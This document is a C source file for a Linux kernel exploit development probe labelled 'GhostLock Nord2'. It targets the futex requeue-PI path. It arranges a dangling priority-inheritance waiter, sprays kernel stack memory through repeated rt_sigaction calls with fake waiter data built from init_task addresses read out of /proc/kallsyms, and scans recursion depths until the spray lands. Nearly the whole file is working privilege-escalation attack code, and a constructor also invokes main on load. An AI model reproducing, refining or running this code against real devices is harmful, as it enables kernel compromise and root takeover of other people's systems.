/*
 * GhostLock Nord2 - rt_sigaction spray depth probe
 * Tests whether rt_sigaction spray lands at waiter->prio.
 * If prio changes from -51 to something else, spray landed.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <signal.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_stop_owner=0;
static int g_depth_offset=0;  /* extra depth to add before rt_sigaction */

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    while(!atomic_load(&g_stop_owner)){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(50);
    }
    return NULL;
}

/* Use recursion to add extra stack depth before spray */
static void deep_spray(uint8_t *sabuf, int depth){
    if(depth > 0){
        volatile char pad[16]; (void)pad; /* ensure frame is allocated */
        deep_spray(sabuf, depth-1);
        return;
    }
    /* At desired depth, call rt_sigaction */
    for(int r=0;r<64;r++)
        syscall(134/*SYS_rt_sigaction*/, SIGUSR1, sabuf, NULL, (size_t)0x5a);
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* Build sigaction with sentinel prio at all possible offsets */
    /* Fill entire sigaction with init_task (safe ptr) for all 8-byte fields */
    /* Set sentinel (99) at positions that might map to waiter->prio */
    uint8_t sabuf[0x72];
    memset(sabuf, 0, sizeof(sabuf));
    
    /* Fill with safe value for all potential lock/task positions */
    uint64_t init_task_val; /* placeholder */
    {
        uint64_t stext=read_sym("_stext");
        init_task_val=stext+0x1c6d300ULL;
    }
    for(int i=0;i<0x72;i+=8) *(uint64_t*)(sabuf+i)=init_task_val;
    
    /* Set sentinel (99, RT prio) at ALL potential prio positions */
    /* waiter->prio is int32 at various possible offsets from sigaction[0] */
    /* Try offsets 0x08..0x60 in steps of 8 for the prio field */
    for(int off=0x08; off<0x72-4; off+=4)
        *(int32_t*)(sabuf+off) = 99; /* sentinel RT prio */
    
    deep_spray(sabuf, g_depth_offset);

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== rt_sigaction Depth Probe ===\n");
    if(!read_sym("_stext")){fprintf(stderr,"[!] kptr_restrict\n");return 1;}

    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    /* Scan depth offsets 0..100 (extra recursion levels) */
    for(int depth=0; depth<=50; depth++){
        g_depth_offset=depth;
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
        atomic_store(&g_stop_owner,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(3000);
        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(30000);
        atomic_store(&g_stop_owner,1);
        pthread_detach(ot); pthread_detach(wt);

        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        if(p < -1 && p != -51 && p != -999){
            fprintf(stderr,"[depth=%d] prio=%d ← SPRAY LANDED! RT=%d\n",depth,p,-(p+1));
        } else if(p == -51){
            /* normal, spray missed */
        } else if(p != -999 && p != 20 && p != 15){
            fprintf(stderr,"[depth=%d] prio=%d (unusual)\n",depth,p);
        }
        usleep(5000);
    }
    fprintf(stderr,"[DONE]\n");
    return 0;
}
__attribute__((constructor)) static void _init(void){main();}
